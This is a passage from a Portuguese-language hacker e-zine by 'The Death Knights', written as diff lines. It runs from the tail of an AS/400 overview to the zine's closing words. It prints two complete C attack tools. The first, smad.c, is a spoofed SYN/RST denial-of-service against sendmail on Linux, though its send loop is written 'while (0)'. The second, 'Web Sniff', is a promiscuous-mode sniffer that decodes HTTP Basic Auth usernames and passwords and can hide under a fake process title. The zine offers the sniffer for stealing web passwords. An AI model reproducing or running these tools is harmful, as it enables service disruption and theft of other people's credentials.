+
+1) Aplicacoes Integradas - comonentes de software, como programas para
+   relacao de banco de dados, programas para seguranca, aplicativos para
+   internet, e ambiente de programacao como parte do sistema operacional.
+2) Grande utilidade - como a maioria dos sistemas da IBM (como o AIX) o
+   AS/400 e' considerado um sistema de grande utilidade, o qual a grande
+   maioria das mudancas feitas nele para se tornarem ativas nao precisam de
+   carregar nenhum IPL ou resetar a maquina.
+3) Multiprocessador - uma maquina AS/400 pode ter varios processadores
+   diferentes separados do processador do sistema, o qual e'  responsavel pela
+   parte de I/O. Observe a seguir uma configuracao tipica do AS/400:
+
+Figure 1.1
+
+                     _______________________
+                     | Processor do Sistema |  // Novos modelos do AS/400 podem
+                     |______________________|  // ter ate' 12 processadores
+                               |
+                               |
+                   ____________|_____________
+                   |  Placa mae do sistema  |
+                   |________________________|
+                   /                        \
+                  /                          \
+             _____|___________        ________|________
+             | Interface I/O |        | Interface I/O |
+             |_______________|        |_______________|
+                  |                           |
+            ______|________           ________|______
+            | SPD I/O Bus |           | PCI I/O Bus |
+            |_____________|           |_____________|
+            /             \
+        Devices......    Servidor PC Integrado
+                         - Novell
+                         - Lotus Domino
+                         - Windows NT
+                         - TCP/IP de PC    	// Independente do TCP/IP
+			     - Firewall TCP/IP  // do OS/400.
+ 			     - Servidor Proxy
+                             - Lotus Domino SMTP Mail
+
+Outras coisas que tornam o AS/400 uma plataforma atrativa sao:
+
+4) Tecnologia de armazenamento por objetos - Programas trabalham com nomes
+   de objetos entao o hardware sempre e' acessado pelos nomes, e nao pelos
+   enderecos como normalmente.
+5) Tamanho de endereco grande - Com um tamanho de espaco de 64 bits, o AS/400
+   pode criar um endereco com ate 18.4 quinqualhoes de bytes.
+6) Totalmente oreintado por objetos - Todas as funcoes do sistema, como
+   estrutura de dados, sao orientadas por objetos. Isto significa que as
+   instrucoes do AS/400 so podem funcionar no proposito em que elas foram
+   criadas para serem funcionar para que os dados nunca sejam tratados como
+   codigo executavel.
+7) Pronto para internet - Os novos sistemas AS/400 tem todas as capacidades
+   para se tornar como servidores web (com todas as capacidades de SSL).
+8) Ambiente de programacao robusto - O OS/400 vem com varios ambientes de
+   programacao diferentes como CL, ILE, COBOL, RPG III e IV, e Java.
+
+II. Conectividade TCP/IP
+
+O AS/400 suporta varias protocolos TCP/IP diferentes como FTP, SMTP,
+Telnet e outros. O AS/400 tem uma implementacao completa de sockets API os
+quais ja sao integrados ao OS/400.
+
+O AS/400 suporta varias interfaces de rede diferentes como token ring,
+ethernet, x.25, serial, frame relay e outras.
+
+III. Estruturas de arquivos
+
+Existem 10 estruturas de arquivos diferentes as quais sao divididas em
+5 categorias principais. Cada estrutura de arquivo tem um comando CRTxxxF
+correspondente o qual e' usado para criar estes arquivos.
+
+Aqui estao os tipos de arquivos:
+
+Tipo de arquivo  Subtipo    Descricao de Arquivo            Comando de criacao
+
+Banco de dados   PF          Arquivo fisico                  CRTPF
+                 LF          Arquivo logico                  CRTLF
+Arquivo Source   SRCPF       Arquivo Source Fisico           CRTSRCPF
+Arquivo Device   DSPF        Arquivo display p/ workstation  CRTDSPF
+                 PRTF        Arquivo de impressao            CRTPRTF
+                 TAPF        Arquivo de fita                 CRTTAPF
+                 DKTF        Arquivo de disquete             CRTDKTF
+                 ICFF        Arquivo de funcao de            CRTICFF
+                             comunicacao interna
+Arquivo DDM      DDMF        Arquivo de tratamento de dados  CRTDDMF
+Arquivo Salvo    SAVF        Arquivo Salvo                   CRTSAVF
+
+Bem, por enquanto e' so' isso... aguardem que vem mais por ai'!
+
+        Cacaio
+        `'`'`'
+
+-=[  13  ]=-
+.--------------------------------.
+|   Vulnerabilidade do Sendmail   \__________________________________________
+`----------------------------------------------------------------------------'
+                                by Cacaio
+
+Opa! A vulnerabilidade a qual mostrarei aqui foi descoberta por Salvatore
+Sanfilippo <antirez@seclab.com>.
+
+A vulnerabilidade e' em relacao a pacotes spoofados(vejam deathknights04).
+Observe como funciona:
+
+Passo 1. Quem ataca manda SYN de sua porta X para a vitima, dst_port=25,
+spoof_addr SPOOFHOST.
+(vitima manda SYN/ACT para o SPOOFHOST)
+
+Passo 2. SPOOFHOST manda RST de sua porta X para a vitima, dst_port=25
+respeitando os numerosda sequencia.
+(em resposta ao SYN/ACK recebido da vitima)
+
+   (a vitima tem um erro em accept() e por 5 segundos rejeita conexoes)
+
+Passo 3. Aguarde aproximadamente 2 segundos.
+
+Passo 4. Volte ao passo 1.
+
+Ah, mas isto so funciona se usado contra Linux, por que o accept() de outros
+OS's tem um retorno diferente.
+
+Aih vai o codigo pra voce fazer o uso disto...
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/*
+ * smad.c - sendmail accept dos -        [http://www.deathknights.com]
+ *
+ * Salvatore Sanfilippo [AntireZ]
+ * Email: antirez@seclab.com
+ *
+ *
+ * compile it under Linux with gcc -Wall -o smad smad.c
+ *
+ * usage: smad fakeaddr victim [port]
+ */
+
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/tcp.h>
+#include <netinet/ip.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <unistd.h>
+
+#define SLEEP_UTIME 100000 /* modifique caso seja necessario */
+
+#define PACKETSIZE (sizeof(struct iphdr) + sizeof(struct tcphdr))
+#define OFFSETTCP  (sizeof(struct iphdr))
+#define OFFSETIP   (0)
+
+u_short cksum(u_short *buf, int nwords)
+{
+        unsigned long sum;
+        u_short *w = buf;
+
+        for (sum = 0; nwords > 0; nwords-=2)
+                sum += *w++;
+
+        sum = (sum >> 16) + (sum & 0xffff);
+        sum += (sum >> 16);
+        return ~sum;
+}
+
+void resolver (struct sockaddr * addr, char *hostname, u_short port)
+{
+        struct  sockaddr_in *address;
+        struct  hostent     *host;
+
+        address = (struct sockaddr_in *)addr;
+
+        (void) bzero((char *)address, sizeof(struct sockaddr_in));
+        address->sin_family = AF_INET;
+        address->sin_port = htons(port);
+        address->sin_addr.s_addr = inet_addr(hostname);
+
+        if ( (int)address->sin_addr.s_addr == -1) {
+                host = gethostbyname(hostname);
+                if (host) {
+                        bcopy( host->h_addr,
+                        (char *)&address->sin_addr,host->h_length);
+                } else {
+                        perror("Could not resolve address");
+                        exit(-1);
+                }
+        }
+}
+
+int main(int argc, char **argv)
+{
+        char runchar[] = "|/-\\";
+        char packet[PACKETSIZE],
+        *fromhost,
+        *tohost;
+
+        u_short fromport        = 3000,
+                toport          = 25;
+
+        struct sockaddr_in local, remote;
+        struct iphdr    *ip     = (struct iphdr*)  (packet + OFFSETIP);
+        struct tcphdr   *tcp    = (struct tcphdr*) (packet + OFFSETTCP);
+
+        struct  tcp_pseudohdr
+        {
+                struct in_addr saddr;
+                struct in_addr daddr;
+                u_char zero;
+                u_char protocol;
+                u_short lenght;
+                struct tcphdr tcpheader;
+        } pseudoheader;
+
+        int sock, result, runcharid = 0;
+
+        if (argc < 3)
+        {
+                printf("usage: %s fakeaddr victim [port]\n", argv[0]);
+                exit(0);
+        }
+        if (argc == 4)
+                toport = atoi(argv[3]);
+
+        bzero((void*)packet, PACKETSIZE);
+        fromhost = argv[1];
+        tohost = argv[2];
+
+        resolver((struct sockaddr*)&local, fromhost, fromport);
+        resolver((struct sockaddr*)&remote, tohost, toport);
+
+        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+        if (sock == -1) {
+                perror("can't get raw socket");
+                exit(1);
+        }
+
+        /* endereco do src */
+        bcopy((char*)&local.sin_addr, &ip->saddr,sizeof(ip->saddr));
+        /* endereco do dst */
+        bcopy((char*)&remote.sin_addr,&ip->daddr,sizeof(ip->daddr));
+
+        ip->version = 4;
+        ip->ihl     = sizeof(struct iphdr)/4;
+        ip->tos     = 0;
+        ip->tot_len = htons(PACKETSIZE);
+        ip->id      = htons(getpid() & 255);
+        /* no flags */
+        ip->frag_off = 0;
+        ip->ttl     = 64;
+        ip->protocol = 6;
+        ip->check   = 0;
+
+        tcp->th_dport = htons(toport);
+        tcp->th_sport = htons(fromport);
+        tcp->th_seq   = htonl(32089744);
+        tcp->th_ack   = htonl(0);
+        tcp->th_off   = sizeof(struct tcphdr)/4;
+        /* 6 bit reserved */
+        tcp->th_flags = TH_SYN;
+        tcp->th_win   = htons(512);
+
+        /* inicio da comedia do pseudo header */
+        bzero(&pseudoheader, 12+sizeof(struct tcphdr));
+        pseudoheader.saddr.s_addr=local.sin_addr.s_addr;
+        pseudoheader.daddr.s_addr=remote.sin_addr.s_addr;
+        pseudoheader.protocol = 6;
+        pseudoheader.lenght = htons(sizeof(struct tcphdr));
+        bcopy((char*) tcp, (char*) &pseudoheader.tcpheader,
+                sizeof(struct tcphdr));
+        /* fim */
+
+        tcp->th_sum   = cksum((u_short *) &pseudoheader,
+                                12+sizeof(struct tcphdr));
+        while (0)
+        {
+                result = sendto(sock, packet, PACKETSIZE, 0,
+                        (struct sockaddr *)&remote, sizeof(remote));
+                if (result != PACKETSIZE)
+                {
+                        perror("sending packet");
+                        exit(0);
+                }
+                printf("\b");
+                printf("%c", runchar[runcharid]);
+                fflush(stdout);
+                runcharid++;
+                if (runcharid == 4)
+                        runcharid = 0;
+                usleep(SLEEP_UTIME);
+        }
+
+        return 0;
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+        Cacaio
+        `'`'`'
+
+-=[  14  ]=-
+.-------------.
+| Web Sniffer  \_____________________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+O web sniiffer sniffa pacotes mandados para webservers e procura nos headers
+por alguma autentificacao basica, e entao automaticamente a decodifica, dando
+em modo texto o login e a senha.
+
+Este programa foi esquecido por algum tempo, mas e' bonzinho e vale apena usar
+se voce quer senhas de paginas http(que usam .htaccess ou similares).
+
+Se divirtam!
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/*
+ *
+ *  Web Sniff v1.0 for Linux
+ *
+ *  Coded by BeastMaster V
+ *
+ *  EMAIL: All questions or
+ *  comments should be sent to
+ *  bryan@scott.net
+ *
+ *
+ *  BUGS: In the verbose mode,
+ *  source/destination headers
+ *  get out of sync with data.
+ *  In daemon mode, source/dest.
+ *  headers may not be reliable.
+ *
+ *  DISCLAIMER: Please use
+ *  this program in a
+ *  responsible manner.
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdarg.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <string.h>
+#include <linux/if.h>
+#include <signal.h>
+#include <termio.h>
+#include <arpa/inet.h>
+#include <linux/socket.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/if_ether.h>
+#include <errno.h>
+
+extern int errno;
+
+#define DEFAULT_WEB_PORT 80
+#define CAPTURE_LENGTH 1024
+#define TIMEOUT 30
+#define INTERFACE "eth0"
+#define ISBLANK(x)  (((x) == ' ') || ((x) == '\t'))
+#define SPACELEFT(buf, ptr)  (sizeof buf - ((ptr) - buf))
+#define newstr(s) strcpy(malloc(strlen(s) + 1), s)
+
+struct BASE64_PARAMS {
+      unsigned long int accum;
+      int               shift;
+      int               save_shift;
+};
+
+struct etherpacket {
+        struct ethhdr ether_header;
+        struct iphdr ip_header;
+        struct tcphdr tcp_header;
+        char buff[8192];
+} ether_packet;
+
+struct
+{
+        unsigned long source_addr;
+        unsigned long dest_addr;
+        unsigned short source_port;
+        unsigned short dest_port;
+        int      bytes_read;
+        char     active;
+        time_t   start_time;
+	char 	 tmp_realm[1024];
+	char     tmp_host[512];
+} target;
+
+struct iphdr *ip;
+struct tcphdr *tcp;
+
+char **Argv = NULL;
+char *LastArgv = NULL;
+
+short daemon_mode;
+short verbose_mode;
+unsigned short user_port;
+FILE *daemon_fd=NULL;
+int sock;
+
+/* function declarations */
+char *lookup(unsigned long int);
+char *dateTime();
+
+/* BeastMaster V's implementation of signal */
+void      (*
+r_signal(sig, func)) (int)
+int     sig;
+void    (*func) ();
+{
+        struct sigaction act, oact;
+
+        act.sa_handler = func;
+
+        sigemptyset(&act.sa_mask);
+        act.sa_flags = 0;
+
+#ifdef SA_RESTART
+        act.sa_flags |= SA_RESTART;
+#endif
+
+      if (sigaction(sig, &act, &oact) < 0)
+              return (SIG_ERR);
+
+      return (oact.sa_handler);
+}
+
+/* this function detaches a process from a controlling terminal */
+void detach()
+{
+        int rc, fd;
+
+        /* Fork once to escape shell's job control */
+        if ((rc = fork()) > 0)
+                exit(0);
+        else if (rc <0) {
+                perror("detach");
+                exit(EXIT_FAILURE);
+        }
+
+        /* Now detach from the controlling terminal */
+        if ((fd = open("/dev/tty", O_RDWR,0)) == -1 ) {
+                printf("couldn't open tty, assuming still okay...\n");
+                fflush((FILE *)stdout);
+                return;
+        }
+
+        ioctl(fd, TIOCNOTTY, 0);
+
+        close(fd);
+
+        /* make us a new process group/session */
+        setsid();
+}
+
+/* this function lets you set the current process title */
+setproctitle(const char *fmt, ...)
+{
+        register char *p;
+        register int i;
+        char buf[2048];
+	va_list args;
+
+        p = buf;
+
+	va_start(args, fmt);
+        (void) vsnprintf(p, SPACELEFT(buf, p), fmt, args);
+	va_end(args);
+
+        i = strlen(buf);
+
+        if (i > LastArgv - Argv[0] - 2)
+        {
+                i = LastArgv - Argv[0] - 2;
+                buf[i] = '\0';
+        }
+        (void) strcpy(Argv[0], buf);
+        p = &Argv[0][i];
+        while (p < LastArgv)
+                *p++ = ' ';
+        Argv[1] = NULL;
+}
+
+/* this function does initialization for setproctitle() */
+void initsetproctitle(int argc, char **argv, char **envp)
+{
+        register int i;
+        extern char **environ;
+
+        for (i = 0; envp[i] != NULL; i++)
+                continue;
+        environ = (char **) malloc(sizeof (char *) * (i + 1));
+        for (i = 0; envp[i] != NULL; i++)
+                environ[i] = newstr(envp[i]);
+        environ[i] = NULL;
+
+        Argv = argv;
+        if (i > 0)
+                LastArgv = envp[i - 1] + strlen(envp[i - 1]);
+        else
+                LastArgv = argv[argc - 1] + strlen(argv[argc - 1]);
+}
+
+/* converts base64 ascii to integer code */
+int cvt_ascii( unsigned char alpha )
+{
+   if      ( (alpha >= 'A') && (alpha <= 'Z') ) return (int)(alpha - 'A');
+   else if ( (alpha >= 'a') && (alpha <= 'z') )
+        return 26 + (int)(alpha - 'a');
+   else if ( (alpha >= '0') && (alpha <= '9' ) )
+        return 52 + (int)(alpha - '0');
+   else if ( alpha == '+' ) return 62;
+   else if ( alpha == '/' ) return 63;
+   else if ( alpha == '=' ) return -2;
+   else                     return -1;
+}
+
+/* this does the actual base64 decoding */
+void base64_decode(char *buf,int quit,struct BASE64_PARAMS *d,char *auth_buf)
+{
+   int index;
+   unsigned long int value;
+   unsigned char blivit;
+   unsigned short j=0;
+
+   index = 0;
+   *(auth_buf+0)='\0';
+
+   while ( ISBLANK(buf[index] ) )
+   {
+      index++;                         /* skip leading blanks */
+   }
+
+   for ( index = 0;
+         (buf[index] != '\n') &&
+         (buf[index] != '\0') &&
+         (buf[index] != ' ' );
+         index++)
+   {
+
+      if (index==(264-5)) return;
+
+      value = cvt_ascii( buf[index] ); /* find chr in base64 alphabet */
+
+      if ( value < 64 )                /* if legal */
+      {
+         d->accum <<= 6;               /* assemble binary accum */
+         d->shift += 6;
+         d->accum |= value;
+         if ( d->shift >= 8 )
+         {
+            d->shift -= 8;
+            value = d->accum >> d->shift;
+            blivit = (unsigned char)value & 0xFFl;
+            *(auth_buf+j) = (char )blivit;
+	    j++;
+         }
+
+      }
+      else                             /* else if out of base64 range */
+      {
+         quit = 1;                     /* then finished */
+         break;
+      }
+   }
+
+   *(auth_buf+j)='\0';
+   return;
+}
+
+/* this is a nice way to call the base64 decode function */
+void decode(char *b64_string, char *user_buff)
+{
+
+        struct BASE64_PARAMS d_p;
+        int quit=0;
+
+        d_p.shift = 0;
+        d_p.accum = 0;
+
+        base64_decode((char *)b64_string, quit, &d_p, user_buff);
+
+        return;
+}
+
+/* checks for authorization and parses out username and password */
+void parse_segment(char *data)
+{
+	short i,j=0;
+	char foo[256];
+  	char user[128];
+	char pass[128];
+
+	if ((!strncmp(data,"GET ",4))||(!strncmp(data,"POST ",5))||(!strncmp(data,"HEAD ",5)))
+		strncpy(target.tmp_realm,data,strlen(data));
+
+	/* you might want to change this to a more intelligent test */
+	if (!strncasecmp(data,"Authorization: Basic",20)) {
+		if (strlen(data+21)>sizeof(foo))
+			*(data+21+sizeof(foo-1))='\0';
+		decode(data+21,foo);
+		for (i=0;foo[i];i++) {
+			if (foo[i]==':')
+				break;
+			user[i]=foo[i];
+		}
+		user[i]='\0';
+		for (++i; foo[i]; i++) {
+			pass[j]=foo[i];
+			j++;
+		}
+		pass[j]='\0';
+		if (daemon_mode) {
+			fprintf(daemon_fd,"\n####### [%s]\n",dateTime());
+			fprintf(daemon_fd,"%s",target.tmp_host);
+			fprintf(daemon_fd,"REALM REQUESTED: %s\n", target.tmp_realm);
+			fprintf(daemon_fd,"---[ USER = %s     PASS = %s ]---\n",user,pass);
+			fprintf(daemon_fd,"#######\n\n");
+			fflush(daemon_fd);
+		} else {
+			printf("\n----------[ USER = %s     PASS = %s ]----------\n",user,pass);
+			fflush(stdout);
+		}
+	}
+
+	return;
+
+}
+
+/* read data from ether_packet.buff and parse check each line */
+int scan_data(int datalen, char *data)
+{
+   int i=0, t=0;
+   char data_buff[CAPTURE_LENGTH];
+
+   target.bytes_read=target.bytes_read+datalen;
+   memset(target.tmp_realm,'\0',sizeof(target.tmp_realm));
+   sprintf(target.tmp_host,"[%s] [%d] => ",lookup(target.source_addr),ntohs(target.source_port));
+   sprintf(data_buff,"[%s] [%d]\n",lookup(target.dest_addr),ntohs(target.dest_port));
+   strcat(target.tmp_host,data_buff);
+
+   data_buff[0]='\0';
+
+   for(i=0;i != datalen;i++)
+   {
+        if(data[i] == 13)
+	{
+		data_buff[t]='\0';
+		if (verbose_mode) {
+			printf("%s\n", data_buff);
+			fflush(stdout);
+		}
+		parse_segment(data_buff);
+		t=0;
+        }
+        if(isprint(data[i]))
+	{
+                data_buff[t]=data[i];
+                t++;
+        }
+        if(t > 255)
+	{
+		t=0;
+		data_buff[t]='\0';
+		if (verbose_mode) {
+			printf("%s\n", data_buff);
+			fflush(stdout);
+		}
+		parse_segment(data_buff);
+        }
+
+   }
+
+}
+
+/* handler for segmentation violations */
+void seg_fault (int sig)
+{
+	fprintf(stderr, "\n");
+	fprintf(stderr, "Segmentation Violation!\n");
+	fprintf(stderr, "\n");
+	fprintf(stderr, "Congratulations! You have crashed my program.\n");
+	fprintf(stderr, "Please mail me:  bryan@scott.net\n");
+	fprintf(stderr, "describing *exactly* what you did to make this\n");
+	fprintf(stderr, "program crash. Thanks and have a nice day :-)\n");
+	fprintf(stderr, "\n");
+	exit(EXIT_FAILURE);
+}
+
+/* resolves a hostname via gethostbyaddr() */
+char *lookup(unsigned long int network_address)
+{
+        static char buf[1024];
+        struct in_addr my_addr;
+        struct hostent *he;
+
+        my_addr.s_addr=network_address;
+        he=gethostbyaddr((char *)&my_addr,sizeof(struct in_addr),AF_INET);
+        if (he==NULL)
+                sprintf(buf,inet_ntoa(my_addr));
+        else
+                sprintf(buf,he->h_name);
+        return (buf);
+}
+
+/* this function returns the data and time */
+char * dateTime()
+{
+        time_t t;
+        char * s;
+
+        time(&t);
+        s = (char *)ctime((const time_t *)&t);
+        s[24] = '\0';
+        return s;
+}
+
+/* handler when program is terminated noramlly */
+void bye(int sig)
+{
+
+	if (daemon_mode) {
+                fprintf(daemon_fd, "\n*** Daemon Mode Ending at [%s] ***\n",dateTime());
+		fclose(daemon_fd);
+	}
+
+	close(sock);
+	exit(0);
+}
+
+/* filters out all other packets except for ones were intrested in */
+int packet_filter ()
+{
+	unsigned short port;
+
+	if (ip->protocol !=6) return (0);
+	if (target.active !=0)
+		if (target.bytes_read > CAPTURE_LENGTH)
+		{
+			bzero(&target, sizeof(target));
+			return(0);
+		}
+
+	if (user_port!=0)
+		port=user_port;
+	else
+		port=DEFAULT_WEB_PORT;
+
+	if (ntohs(tcp->dest)!=port)
+		return(0);
+	else
+	{
+		if (tcp->syn==1)
+		{
+			target.source_addr=ip->saddr;
+			target.dest_addr=ip->daddr;
+			target.active=1;
+			target.source_port=tcp->source;
+			target.dest_port=tcp->dest;
+			target.bytes_read=0;
+			target.start_time=time(NULL);
+			if (verbose_mode) {
+                		printf("[%s] [%d] => ",lookup(target.source_addr),
+				ntohs(target.source_port));
+                		printf("[%s] [%d]\n", lookup(target.dest_addr),
+				ntohs(target.dest_port));
+                		fflush(stdout);
+                	}
+
+		}
+	}
+
+	return(1);
+}
+
+/* prints the usage for our program */
+void print_usage (char *prog_name)
+{
+	printf("\n");
+	printf("### Web Sniffer v1.0 by BeastMaster V ###\n");
+	printf("\n");
+	printf("Usage:\n");
+	printf("\n");
+	printf("%s [-d|-v] [-p <port number>]\n", prog_name);
+	printf("\n");
+	printf("-d : run as a daemon and print output to logfile.\n");
+	printf("-v : run in foreground and print output to stdout.\n");
+	printf("-p : optionally specifies port number to sniff on.\n");
+	printf("\n");
+}
+
+/* start here */
+int main ( argc, argv, envp )
+unsigned int argc;
+char **argv;
+char **envp;
+{
+        int i, x, c;
+	extern int optind;
+	extern char *optarg;
+        struct ifreq req;
+	short argsLeft=0;
+	short errFlag=0;
+	char *port_ptr=NULL;
+	char title[1024];
+
+        r_signal(SIGSEGV, seg_fault);
+        r_signal(SIGTERM, bye);
+        r_signal(SIGQUIT, bye);
+        r_signal(SIGHUP, bye);
+
+        if (getuid() && geteuid()) {
+                fprintf(stderr, "\nYou need to be root in order to run this.\n\n");
+                exit(EXIT_FAILURE);
+        }
+
+	memset(title,'\0',sizeof(title));
+
+	verbose_mode=0;
+	daemon_mode=0;
+	user_port=0;
+
+	while((c=getopt(argc,argv,"dvp:"))!= EOF)
+		switch(c) {
+		   case 'd':
+		       if (verbose_mode)
+		           errFlag++;
+		       else
+			   daemon_mode=1;
+		       break;
+		   case 'v':
+		       if (daemon_mode)
+		           errFlag++;
+		       else
+			   verbose_mode=1;
+		       break;
+		   case 'p':
+		       port_ptr=optarg;
+		       user_port=atoi(port_ptr);
+		       break;
+		   case '?':
+		       errFlag++;
+		}
+
+	argsLeft=argc-optind;
+
+	if ((!daemon_mode && !verbose_mode)||errFlag||argsLeft) {
+		print_usage(argv[0]);
+		exit(EXIT_FAILURE);
+	}
+
+	if (daemon_mode) {
+		printf("\n");
+		printf("*** Daemon Mode ***\n");
+		printf("Enter in the full path to the logfile\n");
+		fgets(title,sizeof(title),stdin);
+                for (c=0; title[c]; c++)
+                        if (title[c]=='\n') {
+                                title[c]='\0';
+                                break;
+                        }
+		if ((daemon_fd=fopen(title,"a+"))==NULL) {
+			fprintf(stderr, "Could not open logfile: %s\n", strerror(errno));
+			exit(EXIT_FAILURE);
+		}
+		printf("Enter in a process title to masquerade as so\n");
+		printf("it won't be quite so obvious to other users what\n");
+		printf("we are really doing (i.e: bash, ftp, in.telnetd, vi ...)\n");
+		fgets(title,sizeof(title),stdin);
+		for (c=0; title[c]; c++)
+			if (title[c]=='\n') {
+				title[c]='\0';
+				break;
+			}
+		printf("Setting process title to: %s\n", title);
+		initsetproctitle(argc, argv, envp);
+		setproctitle("%s", title);
+		printf("Daemon Mode Started.\n");
+		detach();
+		fprintf(daemon_fd, "\n*** Daemon Mode Started at [%s] ***\n",dateTime());
+		fflush(daemon_fd);
+	}
+
+        sock=socket(AF_INET, SOCK_PACKET, htons(0x800));
+        if (sock <0) {
+                perror("can't get SOCK_PACKET socket");
+                exit(1);
+        }
+
+        strcpy(req.ifr_name, INTERFACE);
+
+        if ((i=ioctl(sock, SIOCGIFFLAGS, &req)) ==-1) {
+                close(sock);
+                fprintf(stdout, "I cannot get flags: %s\n", strerror(errno));
+                exit(EXIT_FAILURE);
+        }
+        req.ifr_flags |= IFF_PROMISC;
+        if ((i=ioctl(sock, SIOCSIFFLAGS, &req)) ==-1) {
+                close(sock);
+                fprintf(stdout, "I cannot set flags: %s\n", strerror(errno));
+                exit(EXIT_FAILURE);
+        }
+
+        ip=(struct iphdr *)(((unsigned long)&ether_packet.ip_header)-2);
+        tcp=(struct tcphdr *)(((unsigned long)&ether_packet.tcp_header)-2);
+
+        bzero(&target, sizeof(target));
+
+        for (;;) {
+           while(1) {
+              x=read(sock,&ether_packet,sizeof(ether_packet));
+              if (x > 1)
+              {
+                  if (packet_filter()==0) continue;
+                  x=x-54;
+                  if (x<1) continue;
+                  break;
+              }
+           }
+
+           scan_data(htons(ip->tot_len)-sizeof(ether_packet.ip_header)-
+           sizeof(ether_packet.tcp_header),ether_packet.buff-2);
+
+        }
+
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+        Cacaio
+        `'`'`'
+
+-=[  15  ]=-
+.-----------.
+| FEW WORDS  \_______________________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+        Se voce quiser se tornar um membro, esqueca, ja temos muitos
+        membros.
+
+        Se voce quiser mandar um e-mail dizendo o que achou do zine, dar su-
+        gestoes, reclamar, elogiar, meter o pau, colocar alguma materia, este-
+        ja a vontade.
+
+        AVISO NOVAMENTE:
+
+        O grupo The Death Knights nao visa nenhum fim lucrativo. Qualquer uso
+        das informacoes contidas aqui nao e de nossa responsabilidade. Se voce
+        fizer algo descrito e se der mal, problema seu. Nos ensinamos, mas nao
+        pedimos para usarem o conhecimento adquirido com este zine.
+
+        Ate o proximo numero!
+
+ ______________________________Death_Knights_________________________________
+ ----------------------------------------------------------------------------
+
+                            Criticas? Sugestoes?
+
+                           death@DeathKnights.com
